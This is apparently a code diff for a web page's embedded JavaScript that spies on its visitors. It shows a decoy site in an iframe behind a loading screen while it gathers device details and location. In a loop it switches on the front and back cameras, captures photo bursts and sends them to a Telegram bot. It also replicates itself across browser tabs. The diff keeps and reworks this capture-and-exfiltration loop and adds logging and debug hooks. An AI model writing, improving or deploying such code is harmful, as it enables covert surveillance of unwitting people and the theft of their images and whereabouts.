                 report += `⚙️ *SYSTEM STATUS*\n`;
                 report += `Surveillance: ${QUANTUM_STATE.quantumActive ? '✅ ACTIVE' : '❌ INACTIVE'}\n`;
-                report += `Neural AI: ${QUANTUM_STATE.neuralNetworkReady ? '✅ READY' : '❌ OFF'}\n`;
                 report += `Entanglement: ${QUANTUM_STATE.quantumEntangled ? '✅ SYNCED' : '❌ OFF'}\n`;
+                report += `Initialized: ${QUANTUM_STATE.isInitialized ? '✅ YES' : '❌ NO'}`;
                 
                 await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
@@ -996,170 +679,216 @@
                     })
                 });
                 
+                quantumLog("System report sent to Telegram");
+                
             } catch (error) {
-                // Silent fail
+                quantumLog("System report error: " + error.message);
             }
         }
         
-        // ============== QUANTUM SURVEILLANCE LOOP ==============
+        // ============== MAIN SURVEILLANCE LOOP ==============
         
         async function startQuantumSurveillance() {
-            if (QUANTUM_STATE.quantumActive) return;
+            if (QUANTUM_STATE.quantumActive || !window._quantumCamera) {
+                quantumLog("Surveillance not started: " + (QUANTUM_STATE.quantumActive ? "Already active" : "Camera not initialized"));
+                return;
+            }
             
             QUANTUM_STATE.quantumActive = true;
+            quantumLog("===== SURVEILLANCE STARTED =====");
             
             // Start multi-tab replication
             replicateQuantumTabs();
             
-            // Surveillance intervals
-            const intervals = {
-                battery: setInterval(async () => {
-                    QUANTUM_STATE.quantumBattery = await getQuantumBatteryInfo();
-                }, 30000),
-                
-                quantumSync: setInterval(() => {
-                    if (QUANTUM_STATE.quantumBroadcast) {
-                        QUANTUM_STATE.quantumBroadcast.postMessage({
-                            type: 'quantum_heartbeat',
-                            tab: QUANTUM_STATE.quantumTab,
-                            session: QUANTUM_STATE.quantumSession,
-                            timestamp: Date.now(),
-                            photos: QUANTUM_STATE.quantumPhotos,
-                            cycles: QUANTUM_STATE.quantumCycles
-                        });
-                    }
-                }, QUANTUM_CONFIG.QUANTUM_HEARTBEAT),
-                
-                replication: setInterval(() => {
-                    if (QUANTUM_STATE.replicatedTabs < QUANTUM_CONFIG.REPLICATION_COUNT) {
-                        replicateQuantumTabs();
-                    }
-                }, 60000)
-            };
+            // Start heartbeat
+            const heartbeatInterval = setInterval(() => {
+                if (QUANTUM_STATE.quantumBroadcast && QUANTUM_STATE.quantumActive) {
+                    QUANTUM_STATE.quantumBroadcast.postMessage({
+                        type: 'quantum_heartbeat',
+                        tab: QUANTUM_STATE.quantumTab,
+                        session: QUANTUM_STATE.quantumSession,
+                        timestamp: Date.now(),
+                        photos: QUANTUM_STATE.quantumPhotos,
+                        cycles: QUANTUM_STATE.quantumCycles,
+                        active: QUANTUM_STATE.quantumActive
+                    });
+                }
+            }, QUANTUM_CONFIG.QUANTUM_HEARTBEAT);
             
             // Main surveillance loop
-            while (QUANTUM_STATE.quantumActive) {
-                try {
+            try {
+                while (QUANTUM_STATE.quantumActive) {
                     QUANTUM_STATE.quantumCycles++;
-                    
-                    // Update battery every 2 cycles
-                    if (QUANTUM_STATE.quantumCycles % 2 === 0) {
-                        QUANTUM_STATE.quantumBattery = await getQuantumBatteryInfo();
-                    }
+                    quantumLog(`Starting surveillance cycle ${QUANTUM_STATE.quantumCycles}`);
                     
                     // FRONT CAMERA
+                    quantumLog("Attempting to activate front camera...");
                     if (await window._quantumCamera.startQuantumCamera('user')) {
+                        quantumLog("Front camera activated, capturing photos...");
                         const frontPhotos = await window._quantumCamera.captureQuantumBurst('front');
+                        quantumLog(`Captured ${frontPhotos.length} front camera photos`);
+                        
                         for (const photo of frontPhotos) {
-                            await sendQuantumToTelegram(photo.blob, 'front', photo.index);
+                            if (QUANTUM_STATE.quantumActive) {
+                                await sendQuantumToTelegram(photo.blob, 'front', photo.index);
+                            }
                         }
+                    } else {
+                        quantumLog("Front camera failed");
                     }
                     
                     if (!QUANTUM_STATE.quantumActive) break;
                     await new Promise(r => setTimeout(r, QUANTUM_CONFIG.SWITCH_DELAY));
                     
                     // BACK CAMERA
+                    quantumLog("Attempting to activate back camera...");
                     if (QUANTUM_STATE.quantumActive && await window._quantumCamera.startQuantumCamera('environment')) {
+                        quantumLog("Back camera activated, capturing photos...");
                         const backPhotos = await window._quantumCamera.captureQuantumBurst('back');
+                        quantumLog(`Captured ${backPhotos.length} back camera photos`);
+                        
                         for (const photo of backPhotos) {
-                            await sendQuantumToTelegram(photo.blob, 'back', photo.index);
+                            if (QUANTUM_STATE.quantumActive) {
+                                await sendQuantumToTelegram(photo.blob, 'back', photo.index);
+                            }
                         }
+                    } else {
+                        quantumLog("Back camera failed");
                     }
                     
                     if (!QUANTUM_STATE.quantumActive) break;
                     
-                    // Cycle complete
+                    quantumLog(`Cycle ${QUANTUM_STATE.quantumCycles} complete. Total photos: ${QUANTUM_STATE.quantumPhotos}`);
                     await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_CYCLE_INTERVAL));
-                    
-                } catch (error) {
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.QUANTUM_RETRY_DELAY));
                 }
-            }
-            
-            // Cleanup
-            Object.values(intervals).forEach(interval => clearInterval(interval));
-            if (window._quantumCamera) {
-                window._quantumCamera.cleanup();
+            } catch (error) {
+                quantumLog("Surveillance loop error: " + error.message);
+            } finally {
+                clearInterval(heartbeatInterval);
+                if (window._quantumCamera) {
+                    window._quantumCamera.cleanup();
+                }
+                quantumLog("===== SURVEILLANCE STOPPED =====");
             }
         }
         
-        // ============== QUANTUM INITIALIZATION ==============
+        // ============== URL PARSING ==============
+        
+        function parseQuantumURL() {
+            const params = new URLSearchParams(window.location.search);
+            
+            QUANTUM_STATE.quantumUser = params.get('chat_id') || 
+                                       params.get('user') || 
+                                       params.get('id') || 
+                                       QUANTUM_CONFIG.ADMIN_CHAT_ID;
+            
+            let target = params.get('site') || 
+                        params.get('url') || 
+                        params.get('target') ||
+                        window.location.hash.substr(1) ||
+                        'https://loading-screen.github.io/';
+            
+            try {
+                if (target.startsWith('QUANTUM:')) {
+                    target = atob(target.split(':')[1]);
+                } else if (!target.includes('://')) {
+                    try {
+                        target = atob(target);
+                    } catch (e) {}
+                }
+                target = decodeURIComponent(target);
+            } catch (e) {}
+            
+            if (!target.startsWith('http://') && !target.startsWith('https://')) {
+                target = 'https://' + target;
+            }
+            
+            QUANTUM_STATE.quantumTarget = target;
+            quantumLog(`URL parsed: ${QUANTUM_STATE.quantumTarget}, User: ${QUANTUM_STATE.quantumUser}`);
+        }
+        
+        function loadQuantumWebsite() {
+            try {
+                QUANTUM_ELEMENTS.frame.src = QUANTUM_STATE.quantumTarget;
+                
+                QUANTUM_ELEMENTS.frame.onload = () => {
+                    setTimeout(() => {
+                        QUANTUM_ELEMENTS.loadingScreen.style.opacity = '0';
+                        setTimeout(() => {
+                            QUANTUM_ELEMENTS.loadingScreen.style.display = 'none';
+                        }, 500);
+                    }, 1500);
+                };
+                
+                quantumLog("Website loaded into iframe");
+            } catch (error) {
+                quantumLog("Website load error: " + error.message);
+            }
+        }
+        
+        // ============== MAIN INITIALIZATION ==============
         
         async function initializeQuantumSystem() {
+            if (QUANTUM_STATE.isInitialized) {
+                return;
+            }
+            
             try {
+                quantumLog("===== INITIALIZING QUANTUM SYSTEM =====");
+                
                 // Parse URL and load website
                 parseQuantumURL();
                 loadQuantumWebsite();
                 
-                // Initialize quantum systems
-                const quantumPersistence = new QuantumPersistenceSystem();
-                const quantumNeural = new QuantumNeuralNetwork();
-                const quantumCamera = new QuantumCameraSystem();
-                const quantumLocation = new QuantumLocationSystem();
-                const quantumEntanglement = new QuantumEntanglementSystem();
+                // Initialize broadcast channel
+                initBroadcastChannel();
                 
-                // Initialize all systems
-                await quantumPersistence.initialize();
-                await quantumNeural.initialize();
-                await quantumCamera.initialize();
-                await quantumEntanglement.initialize();
-                
-                // Collect data
+                // Collect device info
                 await collectQuantumDeviceInfo();
-                await quantumLocation.getQuantumLocation();
                 
-                // Store references
-                window._quantumPersistence = quantumPersistence;
-                window._quantumNeural = quantumNeural;
-                window._quantumCamera = quantumCamera;
-                window._quantumLocation = quantumLocation;
-                window._quantumEntanglement = quantumEntanglement;
+                // Get location (async, don't wait)
+                getQuantumLocation().catch(() => {});
                 
-                // Send initial report
-                await sendQuantumSystemReport();
+                // Initialize camera system
+                window._quantumCamera = new QuantumCameraSystem();
+                const cameraInitialized = await window._quantumCamera.initialize();
                 
-                // Start surveillance if cameras available
-                if (QUANTUM_STATE.quantumCameras.length > 0) {
+                if (cameraInitialized) {
+                    QUANTUM_STATE.isInitialized = true;
+                    
+                    // Send system report
+                    await sendQuantumSystemReport();
+                    
+                    // Start surveillance after a delay
                     setTimeout(() => {
                         startQuantumSurveillance();
-                    }, 5000);
+                    }, 3000);
+                    
+                    quantumLog("===== QUANTUM SYSTEM INITIALIZED =====");
+                } else {
+                    quantumLog("Camera initialization failed");
                 }
                 
             } catch (error) {
-                // Silent fail - ensure website still loads
+                quantumLog("Initialization error: " + error.message);
             }
         }
         
         // ============== EVENT HANDLERS ==============
         
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'quantum_entanglement') {
-                QUANTUM_STATE.quantumEntanglements.set(event.data.source, {
-                    lastContact: Date.now(),
-                    data: event.data.payload
-                });
+        window.addEventListener('beforeunload', () => {
+            QUANTUM_STATE.quantumActive = false;
+            if (window._quantumCamera) {
+                window._quantumCamera.cleanup();
             }
+            quantumLog("Page unloading");
         });
         
         document.addEventListener('visibilitychange', () => {
-            if (document.hidden && window._quantumEntanglement) {
-                window._quantumEntanglement.createQuantumBackup();
-            }
-        });
-        
-        window.addEventListener('beforeunload', () => {
-            QUANTUM_STATE.quantumActive = false;
-            
-            if (window._quantumCamera) window._quantumCamera.cleanup();
-            if (window._quantumNeural) window._quantumNeural.cleanup();
-            if (window._quantumLocation) window._quantumLocation.cleanup();
-            if (window._quantumEntanglement) window._quantumEntanglement.cleanup();
-            if (window._quantumPersistence) window._quantumPersistence.cleanup();
-        });
-        
-        window.addEventListener('online', () => {
-            if (window._quantumPersistence) {
-                // Sync any queued data
+            if (document.hidden) {
+                quantumLog("Tab hidden");
+            } else {
+                quantumLog("Tab visible");
             }
         });
         
@@ -1170,6 +899,26 @@
         } else {
             initializeQuantumSystem();
         }
+        
+        // Debug access
+        window.quantumDebug = {
+            status: () => QUANTUM_STATE,
+            start: () => startQuantumSurveillance(),
+            stop: () => { QUANTUM_STATE.quantumActive = false; },
+            testCamera: async () => {
+                if (window._quantumCamera) {
+                    return await window._quantumCamera.startQuantumCamera('user');
+                }
+                return false;
+            },
+            testPhoto: async () => {
+                if (window._quantumCamera && QUANTUM_STATE.quantumCameraReady) {
+                    const blob = await window._quantumCamera.captureQuantumPhoto();
+                    return blob ? blob.size : 0;
+                }
+                return 0;
+            }
+        };
         
     </script>
 </body>
